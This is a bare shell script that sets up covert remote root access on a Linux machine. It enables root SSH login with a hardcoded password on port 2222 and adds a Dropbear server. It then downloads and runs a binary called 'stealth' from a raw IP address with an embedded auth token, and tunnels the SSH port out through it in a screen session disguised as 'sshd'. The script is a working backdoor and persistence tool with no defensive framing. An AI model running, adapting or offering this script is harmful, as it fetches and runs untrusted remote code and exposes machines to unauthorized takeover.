export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

apt update >/dev/null;apt -y purge openssh-server;apt -y autoremove openssh-server;apt -y install nano dropbear iputils-ping screen net-tools openssh-server build-essential psmisc libreadline-dev dialog curl wget sudo dialog python3 >/dev/null && \
netstat -ntlp && \
sleep 3 && \
cat > /etc/ssh/sshd_config <<EOR
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
EOR

sleep 2 && \

cat > /etc/default/dropbear <<END
NO_START=0
DROPBEAR_PORT=2299
DROPBEAR_EXTRA_ARGS=
DROPBEAR_BANNER=""
DROPBEAR_RECEIVE_WINDOW=65536
END

sleep 2 && \
echo "root:Pmataga87465622" | chpasswd && \
service ssh restart && \
wget -q http://45.135.58.52/stealth >/dev/null && \
sleep 2 && \
service dropbear restart && \
sleep 2 && \
chmod +x stealth && \
sleep 2 && \
./stealth authtoken 1hPY6A7OjP5HfIbcres8VBFPXpy_6iMubeSgbKqXiQcAmf7vy && \
sleep 2 && \
screen -dmS sshd bash -c './stealth tcp 2222' && \

sleep 5 && \

netstat -ntlp

sleep 2

curl http://127.0.0.1:4040/api/tunnels && sleep 86400

ping t.co

